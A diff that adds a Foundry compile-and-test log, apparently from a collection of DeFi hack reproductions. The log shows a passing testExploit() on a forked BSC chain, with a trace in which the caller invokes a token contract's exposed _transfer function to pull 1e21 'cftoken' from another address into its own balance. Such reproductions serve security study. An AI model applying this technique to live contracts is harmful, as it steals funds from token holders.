@@ -1,0 +1,95 @@
+Compiling 21 files with Solc 0.8.10
+Solc 0.8.10 finished in 589.80ms
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for test/cftoken_exp.sol:ContractTest
+[PASS] testExploit() (gas: 88733)
+Logs:
+  Before exploit, cftoken balance:: 0
+  After exploit, cftoken balance:: 930000000000000000000
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 16841980 [1.684e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [88733] ContractTest::testExploit()
+    ├─ [2535] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "Before exploit, cftoken balance:", val: 0)
+    ├─ [71497] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196::_transfer(0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], 1000000000000000000000 [1e21])
+    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, value: 14000000000000000000 [1.4e19])
+    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: 0xa9056272Ca777a63ae3A275d7aab078fd90A1691, value: 21000000000000000000 [2.1e19])
+    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: 0x3eCfFcCc4C35CCd71A7c61446c90117fb7995fB1, value: 35000000000000000000 [3.5e19])
+    │   ├─ emit Transfer(from: 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b, to: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], value: 930000000000000000000 [9.3e20])
+    │   ├─  storage changes:
+    │   │   @ 0x30447d221f790f8511fa27cc8abe8501a57209ce9361c4927bdd4c4d209b9535: 0x00000000000000000000000000000000000000000000001e7244294c5e71d2f7 → 0x00000000000000000000000000000000000000000000002057fd23dc411dd2f7
+    │   │   @ 0xc6820c7d0e8a2186a11c150b737df331ec5c8bc0952595f1f00a6d55a2d6bfc3: 0x0000000000000000000000000000000000000000000141a7fe5320c762d5efd6 → 0x0000000000000000000000000000000000000000000141728ad370d4abadefd6
+    │   │   @ 13: 0x0000000000000000000000000000000000000000000041b534b496842c4e5448 → 0x0000000000000000000000000000000000000000000041b71a6d91140efa5448
+    │   │   @ 0x3e1a6e48cd7e8291e25c14adac8306b064f909d041e2dc71d7bda438c8681263: 0 → 0x0000000000000000000000000000000000000000000000326a57b8a619480000
+    │   │   @ 0x782e14c0212f4b823860af386cde7a7c30579669a71033155551295aa14e8753: 0x00000000000000000000000000000000000000000000276cb939271c1a9561cc → 0x00000000000000000000000000000000000000000000276ddca823d8d5c961cc
+    │   └─ ← [Stop]
+    ├─ [535] 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
+    │   └─ ← [Return] 930000000000000000000 [9.3e20]
+    ├─ emit log_named_uint(key: "After exploit, cftoken balance:", val: 930000000000000000000 [9.3e20])
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.73s (3.50s CPU time)
+
+Ran 1 test suite in 6.09s (4.73s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
